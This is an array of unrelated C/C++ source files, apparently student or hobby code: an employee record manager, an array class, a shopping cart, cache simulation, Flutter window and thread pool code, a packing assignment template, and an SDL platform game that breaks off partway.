    "#include<iostream>\r\n#include<bits/stdc++.h>\r\n#include<stdlib.h>\r\n\r\n#include<string>\r\nusing namespace std;\r\nint i=0;\r\nstruct Employee\r\n{\r\n\tint id;\r\n\tfloat salary;\r\n\tstring name , address,phone,department;\r\n}E[25];\r\nvoid insert()\r\n{\r\n\tsystem(\"cls\");\r\n    cout<<\"\\n\\n INSERT EMPLOYEE RECORD   \";\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ID->\";\r\n\t\r\n\tcin>>E[i].id;\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].name);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].address);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE -> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].phone);\r\n\t\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT-> \";\r\n\tcin.ignore();\r\n\tgetline(cin,E[i].department);\r\n\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\r\n\tcin>>E[i].salary;\r\n\ti++;\r\n\tcout<<\"\\n\\n ***EMPLOYEE RECORD INSERTED SUCCCESSFULLY ****\";\r\n}\r\nvoid search()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR SEARCH-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid update()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n----------------------- EMPLOYEE MANAGEMENT SYSTEM-----------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR UPDATE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE NAME-> \";\r\n\t\t\t\tcin.ignore();\t\t\t\tgetline(cin,E[a].name);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE ADDRESS-> \";\r\n\t\t\t\r\n\t\t\t\tgetline(cin,E[a].address);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE PHONE NO.-> \";\r\n\t\t\t\t\r\n\t\t\t\tcin>>E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE DEPARTMENT -> \";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tgetline(cin,E[a].department);\r\n\t\t\t\tcout<<\"\\n\\n ENTER EMPLOYEE SALARY-> \";\r\n\t\t\t\tcin>>E[a].salary;\r\n\t\t\t\tfound++;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD UPDATE SUCCESSFULLY ***\";\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid del()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n-------------------- EMPLOYEE MANAGEMENT SYSTEM--------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint found=0;\r\n\t\tint t_id;\r\n\t\tcout<<\"\\n\\n ENTER EMPLOYEE ID FOR DELETE-> \";\r\n\t\tcin>>t_id;\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\tif(t_id==E[a].id)\r\n\t\t\t{\r\n\t\t\tfor(int k=a;k<i-1;k++)\r\n\t\t\t{\r\n\t\t\t\tE[k].id=E[k+1].id;\r\n\t\t\t\tE[k].name=E[k+1].name;\r\n\t\t\t\tE[k].address=E[k+1].address;\r\n\t\t\t\tE[k].phone=E[k+1].phone;\r\n\t\t\t\tE[k].department=E[k+1].department;\r\n\t\t\t\tE[k].salary=E[k+1].salary;\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\ti--;\r\n\t\t\t\tcout<<\"\\n\\n *** RECORD DELETE  SUCCESSFULLY ***\";\r\n\t\t\t\tfound++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif(found==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n ***EMPLOYEE ID NOT FOUND*** \";\r\n\t\t}\r\n\t}\r\n}\r\nvoid show()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout<<\"\\n\\n --------------------EMPLOYEE MANAGEMENT SYSTEM-------------------\";\r\n\tif(i==0)\r\n\t{\r\n\t\tcout<<\"\\n\\n DATA BASE IS EMPTY\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\r\n\t\tfor(int a=0;a<i;a++)\r\n\t\t{\r\n\t\t\t\r\n\t\t     \tcout<<\"\\n\\n EMPLOYEE ID -> \"<<E[a].id;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE NAME-> \"<<E[a].name;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE ADDRESS-> \"<<E[a].address;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE PHONE NO.-> \"<<E[a].phone;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE DEPARTMENT -> \"<<E[a].department;\r\n\t\t\t\tcout<<\"\\n\\n EMPLOYEE SALARY-> \"<<E[a].salary;\r\n\t\t\t\tcout<<\"\\n\\n ---------------------------------------\";\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\r\n\t}\r\n}\r\nint main()\r\n{\r\n\tp:\r\n\t\r\n\t\r\n\t\tint choice;\r\n\tfor(int i=1;i<=23;i++)\r\n\t{\r\n\t    \r\n\t\r\n\tcout<<\"\\n\\n EMPLOYEE MANAGEMENT SYSTEM\";\r\n\tcout<<\"\\n\\n 1. INSERT EMPLOYEE\";\r\n\tcout<<\"\\n\\n 2. SEARCH EMPLOYEE\";\r\n\tcout<<\"\\n\\n 3. UPDATE EMPLOYEE \";\r\n\tcout<<\"\\n\\n 4. DELETE  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 5. SHOW ALL  EMPLOYEE \";\r\n\tcout<<\"\\n\\n 6. EXIT\";\r\n\tcout<<\"\\n\\n ENTER YOUR CHOICE-> \";\r\n\tcin>>choice;\r\n\t\r\n\tswitch(choice)\r\n\t{\r\n\t\tcase 1:\r\n\t\t\tinsert();\r\n\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tsearch();\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tupdate();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 4:\r\n\t\t\t\t\t\tdel();\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tcase 5:\r\n\t\t\t\t\t\t\tshow();\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\tcase 6:\r\n\t\t\t\t\t\t\t\texit(0);\r\n\t\t\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\t\t\t\tcout<<\"\\n\\n INVALID OPTION.... PLEASE TRY AGAIN \";\r\n\t\t\t\t\t\t\t\t\t\r\n\t}\r\n\t}\r\n\treturn 0;\r\n\tgoto p;\r\n}\r\n\r\n",
    "\ufeff\n\n#include <iostream>\nclass arr_error : public std::exception\n{\n\tstd::string message;\npublic:\n\tarr_error(const std::string& message) : message { message } {}\n\tconst char* what() const noexcept override\n\t{\n\t\treturn message.c_str();\n\t}\n};\nclass smart_array \n{\n\tint num_of_arr;\n\tint* arr=nullptr;\n\tint count{0};\npublic: \n\tsmart_array(int c) \n\t{\n\t\tnum_of_arr = c;\n\t\tint* arr_some = new int[num_of_arr] {};\n\t\tdelete[] arr;\n\t\tarr = arr_some;\n\t}\n\t~smart_array() { delete[] arr; }\n\n\tvoid add_element(int c)\n\t{\n\t\tif (count >= num_of_arr) \n\t\t{\n\t\t\tthrow arr_error(\"Array out of bonds\");\n\t\t\treturn;\n\t\t}\n\t\tarr[count] = c;\n\t\tcount++;\n\t}\n\tint get_element(int c) \n\t{ \n\t\tif (c > num_of_arr)\n\t\t{\n\t\t\tthrow arr_error(\"Wrong index\");\n\t\t\treturn -1;\n\t\t}\n\t\tc--;\n\t\treturn arr[c]; \n\t}\n};\n\nint main()\n{\n\ttry {\n\t\tsmart_array arr(5);\n\t\tarr.add_element(1);\n\t\tarr.add_element(4);\n\t\tarr.add_element(155);\n\t\tarr.add_element(14);\n\t\tarr.add_element(15);\n\n\t\tstd::cout << arr.get_element(1) << std::endl;\n\t\t\n\t}\n\tcatch (const std::exception& ex) {\n\t\tstd::cout << ex.what() << std::endl;\n\t}\n}",
    "#include \"ShoppingCart.h\"\n#include <iostream>\nusing namespace std;\n\nShoppingCart::ShoppingCart() : customerName(\"none\"), currentDate(\"January 1, 2016\") {}\n\nShoppingCart::ShoppingCart(const string& name, const string& date) : customerName(name), currentDate(date) {}\n\nstring ShoppingCart::GetCustomerName() const {\n    return customerName;\n}\n\nstring ShoppingCart::GetDate() const {\n    return currentDate;\n}\n\nvoid ShoppingCart::AddItem(const ItemToPurchase& item) {\n    cartItems.push_back(item);\n}\n\nvoid ShoppingCart::RemoveItem(const string& itemName) {\n    for (auto it = cartItems.begin(); it != cartItems.end(); ++it) {\n        if (it->GetName() == itemName) {\n            cartItems.erase(it);\n            return;\n        }\n    }\n    cout << \"Item not found in cart. Nothing removed.\" << endl;\n}\n\nvoid ShoppingCart::ModifyItem(const ItemToPurchase& item) {\n    bool found = false;\n    for (auto& cartItem : cartItems) {\n        if (cartItem.GetName() == item.GetName()) {\n            found = true;\n            if (item.GetDescription() != \"none\") cartItem.SetDescription(item.GetDescription());\n            if (item.GetPrice() != 0) cartItem.SetPrice(item.GetPrice());\n            if (item.GetQuantity() != 0) cartItem.SetQuantity(item.GetQuantity());\n        }\n    }\n    if (!found) {\n        cout << \"Item not found in cart. Nothing modified.\" << endl;\n    }\n}\n\nint ShoppingCart::GetNumItemsInCart() const {\n    int totalQuantity = 0;\n    for (const auto& item : cartItems) {\n        totalQuantity += item.GetQuantity();\n    }\n    return totalQuantity;\n}\n\ndouble ShoppingCart::GetCostOfCart() const {\n    double totalCost = 0;\n    for (const auto& item : cartItems) {\n        totalCost += item.GetQuantity() * item.GetPrice();\n    }\n    return totalCost;\n}\n\nvoid ShoppingCart::PrintTotal() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"Number of Items: \" << GetNumItemsInCart() << endl << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemCost();\n        }\n    }\n\n    cout << \"\\nTotal: $\" << GetCostOfCart() << endl;  \n} \n\nvoid ShoppingCart::PrintDescriptions() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"\\nItem Descriptions\" << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemDescription();\n        }\n    }\n}\n\n",
    "#ifndef _LARGEFILE_SOURCE\r\n#define _LARGEFILE_SOURCE\r\n#endif\r\n#ifndef __USE_LARGEFILE64\r\n#define __USE_LARGEFILE64\r\n#endif\r\n#ifndef _LARGEFILE64_SOURCE\r\n#define _LARGEFILE64_SOURCE\r\n#endif\r\n#ifndef _GNU_SOURCE\r\n#define _GNU_SOURCE\r\n#endif\r\n\r\n#include \"cacheReplay.h\"\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n#include <errno.h>\r\n#include <limits.h>\r\n#include <ftw.h>\r\n#include <search.h>\r\n#include <iostream>\r\n#include <map>\r\n#include <string>\r\n#include <list>\r\n#include <vector>\r\n#include <fstream>\r\n#include <math.h>\r\n\r\nusing namespace std;\r\n\r\ndouble rand_val(void);\r\n\r\nint select_filesize(vector<long long int> *sizevec)\r\n{\r\n\tint vecsize = (*sizevec).size();\r\n\tint random;\r\n\r\n\tif (vecsize == 0)\r\n\t\treturn 16*1024;\r\n\trandom = rand() % vecsize;\r\n\r\n\tint\tvalue = (*sizevec)[random];\r\n\t\r\n\treturn value;\r\n}\r\n\r\nint select_unique(double unique)\r\n{\r\n\tint random = rand() % 1000;\r\n\tif (random < unique * 1000)\r\n\t\treturn true;\r\n\r\n\treturn false;\r\n}\r\n\r\nstruct CacheFileInfo* try_reuse(struct CacheRef *fileref)\r\n{\r\n\tint refsize = fileref->total_ref;\r\n\tint random, number;\r\n\t\r\n\tif (refsize <= 0)\r\n\t\treturn NULL;\r\n\r\n\trandom = rand() % refsize;\r\n\tstd::list<CacheFileInfo*>::iterator it;\r\n\r\n\tnumber = 0;\r\n\r\n\tfor (it = fileref->filelist.begin(); it != fileref->filelist.end(); ++it) {\r\n\t\tstruct CacheFileInfo* fileinfo = *(it);\r\n\t\tnumber += fileinfo->ref;\r\n\t\tif (random < number) {\r\n\t\t\tfileinfo->ref--;\r\n\t\t\tif (fileref->total_ref > 0) \r\n\t\t\t\tfileref->total_ref--;\r\n\t\t\telse {\r\n\t\t\t\tcout << \"WARNING: total_ref: to fix ref\" << endl;\r\n\t\t\t\tstd::list<CacheFileInfo*>::iterator it2;\r\n\t\t\t\tint new_ref = 0;\r\n\t\t\t\tfor (it2 = fileref->filelist.begin(); it2 != fileref->filelist.end(); ++it2) {\r\n\t\t\t\t\tnew_ref += fileinfo->ref;\r\n\t\t\t\t}\r\n\t\t\t\tfileref->total_ref = new_ref;\r\n\t\t\t}\t\t\r\n\t\t\tif (fileinfo->ref <= 0) {\r\n\t\t\t\tfileref->filelist.erase(it);\r\n\t\t\t}\r\n\t\t\treturn fileinfo;\r\n\t\t}\r\n\t}\r\n\tcout << \"ERROR: try_reuse \" << refsize << \" \" << number << endl;\r\n\treturn NULL;\r\n}\r\n\r\ndouble rand_val(void)\r\n{\r\n\tconst long  a =      16807;  // Multiplier\r\n    const long  m = 2147483647;  // Modulus\r\n\tconst long  q =     127773;  // m div a\r\n\tconst long  r =       2836;  // m mod a\r\n\tstatic long x = 1;           // Random int value\r\n    long        x_div_q;         // x divided by q\r\n\tlong        x_mod_q;         // x modulo q\r\n\tlong        x_new;           // New x value\r\n\r\n// RNG using integer arithmetic\r\n\tx_div_q = x / q;\r\n\tx_mod_q = x % q;\r\n\tx_new = (a * x_mod_q) - (r * x_div_q);\r\n\tif (x_new > 0)\r\n\t\tx = x_new;\r\n\telse\r\n\t\tx = x_new + m;\r\n\r\n\t// Return a random value between 0.0 and 1.0\r\n\treturn((double) x / m);\r\n}\r\n\r\ndouble calc_c(int max_ref)\r\n{\r\n\tint i;\r\n\tdouble c = 0;\r\n\tdouble alpha = 1.0;\r\n\r\n\tfor (i = 1; i <= max_ref; i++)\r\n\t\tc = c + (1/pow((double)i, alpha));\r\n\tc = 1.0 / c;\r\n\r\n\treturn c;\r\n}\r\n\r\nint select_ref(double onetimes, double c, double zipf_slope, int max_ref)\r\n{\r\n\tint random, i;\r\n\tdouble zipf_value;\r\n\tdouble sum_prob;\r\n\tdouble urand;\r\n\tdouble alpha = 1.0;\r\n\r\n\trandom = rand() % 1000;\r\n\r\n\tif (random < onetimes * 1000)\r\n\t\treturn 0;\r\n\r\n\tdo {\r\n\t\turand = rand_val();\r\n\t}\r\n\twhile ((urand == 0) || (urand == 1));\r\n\r\n\tsum_prob = 0;\r\n\tfor (i = 1; i <= max_ref; i++)\r\n\t{\r\n\t\tsum_prob = sum_prob + c / pow((double) i, zipf_slope);\r\n\t\tif (sum_prob >= urand) {\r\n\t\t\tzipf_value = i;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\treturn zipf_value;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"../include/thread_pool.h\"\n\nTask::Task(std::function<void()> &&__op, int __taskId) {\n  op = __op;\n  taskId = __taskId;\n}\n\nvoid ThreadPool::worker() {\n  while (GetStatus() == STATUS_WORKING) {\n    auto [task, taskId, ok] = opWithMutex(statusLock, [this]() {\n      if (this->taskQueue.empty()) {\n        return std::make_tuple(std::function<void()>{}, 0, false);\n      }\n      auto [task, id] = this->taskQueue.front();\n      this->taskQueue.pop();\n      return std::make_tuple(task, id, true);\n    });\n\n    if (!ok) {\n      std::this_thread::sleep_for(std::chrono::milliseconds(500));\n      continue;\n    }\n\n    auto future = std::async(std::launch::async, task);\n\n    try {\n      future.get();\n      Logger::info(\"Task processed success, id=\", taskId);\n    } catch (const std::exception &e) {\n      Logger::error(\"Task processed error, id=\", taskId, \", err=\", e.what());\n    }\n  }\n}\n\nThreadPool::ThreadPool(int threadCount) {\n  status = STATUS_STOPPED;\n  Start(threadCount);\n}\n\nint ThreadPool::GetStatus() {\n  return opWithMutex(statusLock, [this]() { return this->status; });\n}\n\nvoid ThreadPool::Shutdown() {\n  auto cnt = opWithMutex(statusLock, [this]() {\n    this->status = STATUS_STOPPED;\n    return this->taskQueue.size();\n  });\n  for (auto &thread : threads) {\n    if (thread.joinable()) {\n      thread.join();\n    }\n  }\n  threads.clear();\n  Logger::info(\"Thread pool shutdown, \", cnt, \" task in queue\");\n}\n\nThreadPool::~ThreadPool() { Shutdown(); }\n\nvoid ThreadPool::Start(int threadCount) {\n  opWithMutex(statusLock, [this, threadCount]() {\n    if (this->status == STATUS_WORKING) {\n      Logger::info(\"Thread pool has started\");\n      return;\n    }\n    this->status = STATUS_WORKING;\n    for (int i = 0; i < threadCount; i++) {\n      threads.emplace_back(&ThreadPool::worker, this);\n    }\n    Logger::info(\"Thread pool start\");\n  });\n}",
    "// NAME: \n// NUSNET ID: \n// PLAB USERID: \n\n// FILE: package.cpp\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\n#include <cmath>    // for the ceil() function.\nusing namespace std;\n\n\n// CuboidObject class\nclass CuboidObject\n{\nprotected:\n    double _length, _width, _height, _mass;\npublic:\n    CuboidObject() {}\n    CuboidObject( double length, double width, double height, double mass )\n      : _length(length), _width(width), _height(height), _mass(mass) {}\n\n    double getLength() { return _length; }\n    double getWidth()  { return _width; }\n    double getHeight() { return _height; }\n    double getVolume() { return _length * _width * _height; }\n    double getMass()   { return _mass; }\n};\n\n\n// Book class\nclass Book : public CuboidObject\n{\nprivate:\n    string _title;\npublic:\n    Book( string title, double length, double width, \n          double height, double mass )\n      : CuboidObject( length, width, height, mass ), _title(title) {}\n\n    string getTitle() { return _title; }\n};\n\n\n// Package class\nclass Package : public CuboidObject\n{\nprivate:\n    vector<Book*> _books;\n\n    // _improvedLength and _improvedWidth contain the length and \n    // width of the package when the improved packing method is used.\n    double _improvedLength, _improvedWidth;\n\n    // _length and _width from CuboidObject contain the length and\n    // width of the package when the standard packing method is used.\n\n    void _computeStandardLengthWidth();\n    void _computeImprovedLengthWidth();\n\npublic:\n    Package( vector<Book*> &books );\n    vector<Book*>& getBooks() { return _books; }\n    double getImprovedLength() { return _improvedLength; }\n    double getImprovedWidth()  { return _improvedWidth; }\n};\n\n\n// Constructor of Package.\n\nPackage::Package( vector<Book*> &books ) : _books(books)\n{\n    // Write your code here.\n\n}\n\n\n// Sets _length and _width to the length and width of the package\n// produced using the standard packing method.\n\nvoid Package::_computeStandardLengthWidth()\n{\n    // Write your code here.\n\n}\n\n\n// Sets _improvedLength and _improvedWidth to the length and width \n// of the package produced using the improved packing method.\n\nvoid Package::_computeImprovedLengthWidth()\n{\n    // Write your code here.\n\n}\n\n\n// Returns the billable mass of the input package.\n\ndouble computeBillableMass( Package &package )\n{\n    const double volMassFactor = 500.0;\n\n    // Write your code here.\n\n}\n\n\n// Returns the shipping charge given the billable mass.\n\ndouble computeShippingCharge( double billableMass )\n{\n    // Write your code here.\n\n}\n\n\nint main()\n{\n    vector<Book*> books;\n\n    // Write your code here to read the inputs.\n\n\n    // Outputs\n    Package package( books );\n    double billableMass = computeBillableMass( package );\n    double shippingCharge = computeShippingCharge( billableMass );\n\n    cout << setprecision(2) << fixed;\n    cout << \"Package standard length (m): \" << package.getLength() << endl;\n    cout << \"Package standard width (m): \" << package.getWidth() << endl;\n    cout << \"Package height (m): \" << package.getHeight() << endl;\n    cout << \"Package mass (kg): \" << package.getMass() << endl;\n    cout << \"Billable mass (kg): \" << billableMass << endl;\n    cout << \"Shipping charge ($): \" << shippingCharge << endl;\n\n    cout << \"Package improved length (m): \"\n         << package.getImprovedLength() << endl;\n    cout << \"Package improved width (m): \"\n         << package.getImprovedWidth() << endl;\n\n    // Not required to deallocate dynamically allocated memory.\n\n    return 0;\n}\n",
    "\n#define _USE_MATH_DEFINES\n#include<math.h>\n#include<stdio.h>\n#include<string.h>\n\nextern \"C\" {\n#include\"./SDL2-2.0.10/include/SDL.h\"\n#include\"./SDL2-2.0.10/include/SDL_main.h\"\n}\n\n#define FPS 150\n#define TARGET_TIME (1000/FPS)\n\n#define SCREEN_WIDTH\t680\n#define SCREEN_HEIGHT\t520\n#define PLATFORM_DIFF\t70\t\n#define POCZATKOWA_X_GR (SCREEN_WIDTH - (SCREEN_WIDTH * 0.96))\t// 0.95 / 0.15\n#define POCZATKOWA_Y_GR (SCREEN_HEIGHT - 43)\t// poczatkowa 43 / 403\n#define LICZBA_ETAPOW 3\n#define LICZBA_BECZEK 6\n\n#define PREDKOSC_POZIOMA\t\t160.00\n#define PREDKOSC_PIONOWA\t\t80.00\n#define PREDKOSC_GRAWITACYJNA\t120.00\n#define PREDKOSC_BECZKI\t\t\t100.0\n\n#define PLATFORMS_ONE\t7\t// iloscc platform na etap\n#define PLATFORMS_TWO\t10\n#define PLATFORMS_THREE\t10\t\n#define LADDERS_ONE\t\t6\t// ilosc drabin na etap\n#define LADDERS_TWO\t\t6\t\n#define LADDERS_THREE\t7\t\n\ntypedef struct {\n\tdouble x;\n\tdouble y;\n\tSDL_Rect rect;\n}Person;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Platform;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Ladder;\n\ntypedef struct {\n\tfloat x;\n\tfloat y;\n\tint pkt_kontrolny;\n\tSDL_Rect rect;\n} Barrel;\n\ntypedef struct {\n\tint x, y, w, h;\n\tbool mysz;\n} Obszar;\n\n// narysowanie napisu txt na powierzchni screen, zaczynaj\u00b9c od punktu (x, y)\n// charset to bitmapa 128x128 zawieraj\u00b9ca znaki\nvoid DrawString(SDL_Surface* screen, int x, int y, const char* text, SDL_Surface* charset) {\n\tint px, py, c;\n\tSDL_Rect s, d;\n\ts.w = 8;\n\ts.h = 8;\n\td.w = 8;\n\td.h = 8;\n\twhile (*text) {\n\t\tc = *text & 255;\n\t\tpx = (c % 16) * 8;\n\t\tpy = (c / 16) * 8;\n\t\ts.x = px;\n\t\ts.y = py;\n\t\td.x = x;\n\t\td.y = y;\n\t\tSDL_BlitSurface(charset, &s, screen, &d);\n\t\tx += 8;\n\t\ttext++;\n\t};\n};\n\n\n// narysowanie na ekranie screen powierzchni sprite w punkcie (x, y)\n// (x, y) to punkt \u0153rodka obrazka sprite na ekranie\nvoid DrawSurface(SDL_Surface* screen, SDL_Surface* sprite, int x, int y) {\n\tSDL_Rect dest;\n\tdest.x = x - sprite->w / 2;\n\tdest.y = y - sprite->h / 2;\n\tdest.w = sprite->w;\n\tdest.h = sprite->h;\n\tSDL_BlitSurface(sprite, NULL, screen, &dest);\n};\n\n\n// rysowanie pojedynczego pixela\nvoid DrawPixel(SDL_Surface* surface, int x, int y, Uint32 color) {\n\tint bpp = surface->format->BytesPerPixel;\n\tUint8* p = (Uint8*)surface->pixels + y * surface->pitch + x * bpp;\n\t*(Uint32*)p = color;\n};\n\n\n// rysowanie linii o d\u00b3ugo\u0153ci l w pionie (gdy dx = 0, dy = 1) \n// b\u00b9d\u0178 poziomie (gdy dx = 1, dy = 0)\nvoid DrawLine(SDL_Surface* screen, int x, int y, int l, int dx, int dy, Uint32 color) {\n\tfor (int i = 0; i < l; i++) {\n\t\tDrawPixel(screen, x, y, color);\n\t\tx += dx;\n\t\ty += dy;\n\t};\n};\n\n\n// rysowanie prostok\u00b9ta o d\u00b3ugo\u0153ci bok\u00f3w l i k\nvoid DrawRectangle(SDL_Surface* screen, int x, int y, int l, int k,\n\tUint32 outlineColor, Uint32 fillColor) {\n\tint i;\n\tDrawLine(screen, x, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x + l - 1, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x, y, l, 1, 0, outlineColor);\n\tDrawLine(screen, x, y + k - 1, l, 1, 0, outlineColor);\n\tfor (i = y + 1; i < y + k - 1; i++)\n\t\tDrawLine(screen, x + 1, i, l - 2, 1, 0, fillColor);\n};\n\nint checkCollision(SDL_Rect rect1, SDL_Rect rect2) {\n\treturn rect1.x < rect2.x + rect2.w &&\n\t\trect1.x + rect1.w > rect2.x &&\n\t\trect1.y < rect2.y + rect2.h &&\n\t\trect1.y + rect1.h > rect2.y;\n};\n\nbool checkCollisionAtPosition(const Platform& platform, const Ladder& drabina, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9 i drabin\u00b9\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, drabina.rect);\n}\n\nbool checkCollisionAtPositionSide(const Platform& platform, Person gracz, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9  i graczem od boku\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, gracz.rect);\n}\n\nint czyMyszNadObszarem(int x, int y, const Obszar* obszar) {\n\treturn (x >= obszar->x && x <= obszar->x + obszar->w &&\n\t\ty >= obszar->y && y <= obszar->y + obszar->h);\n}\n\nbool restartEtapu(double* worldTime, Person* gracz) {\n\t*worldTime = 0;\n\n\tgracz->x = (double)(POCZATKOWA_X_GR);\n\tgracz->y = (double)(POCZATKOWA_Y_GR);\n\n\tgracz->rect.x = (int)gracz->x;\n\tgracz->rect.y = (int)gracz->y;\n\n\treturn 